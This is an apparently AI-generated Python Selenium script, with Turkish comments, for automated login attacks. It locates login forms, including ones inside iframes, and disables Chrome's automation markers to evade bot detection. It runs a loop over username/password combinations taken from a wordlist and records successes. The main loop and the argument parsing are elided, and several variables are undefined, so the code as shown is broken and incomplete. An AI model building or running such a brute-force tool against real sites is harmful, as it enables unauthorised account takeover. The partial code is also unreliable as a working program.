# --- AI SIGNATURE: ROBUST-ELEMENT-FINDER-SCRIPT ---
import argparse
import sys
import time
from tqdm import tqdm
from colorama import Fore, Style, init

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import NoSuchElementException, WebDriverException, TimeoutException
except ImportError:
    print(f"{Fore.RED}[!] Gerekli Selenium kütüphaneleri bulunamadı. Lütfen 'pip install selenium colorama tqdm' ile kurun.")
    sys.exit(1)

init(autoreset=True)

def set_input_value_and_trigger_events(driver, element, value):
    driver.execute_script("""
        var input = arguments[0], value = arguments[1];
        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
        nativeInputValueSetter.call(input, value);
        input.dispatchEvent(new Event('input', { bubbles: true }));
        input.dispatchEvent(new Event('change', { bubbles: true }));
    """, element, value)

def find_login_elements(driver):
    """iframe'leri de kontrol ederek login formunu ve inputları akıllıca bulur."""
    print("DEBUG: Login elementleri aranıyor...")
    wait = WebDriverWait(driver, 10)
    
    # Önce ana sayfada ara
    try:
        form = wait.until(EC.presence_of_element_located((By.TAG_NAME, 'form')))
        pass_input = form.find_element(By.CSS_SELECTOR, "input[type='password']")
        # Kullanıcı adı için daha esnek seçiciler
        user_input_selectors = [
            "input[type='text']", "input[type='email']",
            "input[name*='user']", "input[name*='login']", "input[name*='email']",
            "input[id*='user']", "input[id*='login']", "input[id*='email']"
        ]
        for selector in user_input_selectors:
            try:
                user_input = form.find_element(By.CSS_SELECTOR, selector)
                if user_input.is_displayed():
                    print("DEBUG: Ana sayfada login elementleri bulundu.")
                    return form, user_input, pass_input
            except NoSuchElementException:
                continue
    except (TimeoutException, NoSuchElementException):
        print("DEBUG: Ana sayfada form bulunamadı, iframe'ler kontrol ediliyor.")

    # iframe'lerde ara
    iframes = driver.find_elements(By.TAG_NAME, 'iframe')
    for frame in iframes:
        try:
            driver.switch_to.frame(frame)
            print(f"DEBUG: iframe '{frame.get_attribute('id') or frame.get_attribute('name')}' içine girildi.")
            form = wait.until(EC.presence_of_element_located((By.TAG_NAME, 'form')))
            pass_input = form.find_element(By.CSS_SELECTOR, "input[type='password']")
            for selector in user_input_selectors:
                try:
                    user_input = form.find_element(By.CSS_SELECTOR, selector)
                    if user_input.is_displayed():
                        print("DEBUG: iframe içinde login elementleri bulundu.")
                        return form, user_input, pass_input
                except NoSuchElementException:
                    continue
            driver.switch_to.default_content() # Ana sayfaya geri dön
        except (TimeoutException, NoSuchElementException):
            print("DEBUG: Bu iframe'de form bulunamadı.")
            driver.switch_to.default_content()
            continue
            
    raise NoSuchElementException("Otomatik olarak login formu, kullanıcı adı veya şifre alanı bulunamadı.")


def initialize_driver(browser, headless):
    print(f"DEBUG: Tarayıcı '{browser}' için ayarlar yapılıyor.")
    if browser == 'chrome':
        from selenium.webdriver.chrome.options import Options as ChromeOptions
        options = ChromeOptions()
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
    else: # firefox
        from selenium.webdriver.firefox.options import Options as FirefoxOptions
        options = FirefoxOptions()

    if headless: options.add_argument('--headless')
    options.add_argument('--no-sandbox'); options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu'); options.add_argument('--window-size=1280x800')
    
    if browser == 'chrome': driver = webdriver.Chrome(options=options)
    else: driver = webdriver.Firefox(options=options)
    return driver

# ... (Parser, URL düzeltme, wordlist okuma aynı) ...
# ...

# Ana Mantık
# ...
try:
    driver = initialize_driver(args.browser, args.headless)
    driver.get(args.url)
    
    form, user_input, pass_input = find_login_elements(driver)
    
    # UZUNLUK TESPİTİ ve FİLTRELEME
    # ... (Bu kısım, elementler bulunduktan sonra çalışacak)

    # Ana döngü başlıyor
    while current_combo_index < len(combos):
        # ... (Döngü mantığı aynı kalacak, ama find_login_elements kullanılacak)
        
except Exception as e:
    print(f"\n{Fore.RED}KRİTİK HATA: {e}")
finally:
    if driver: driver.quit()
    success_log.close()
    print("\n[+] Tarama tamamlandı.")

# --- AI SIGNATURE: ROBUST-ELEMENT-FINDER-SCRIPT-BITIS --- 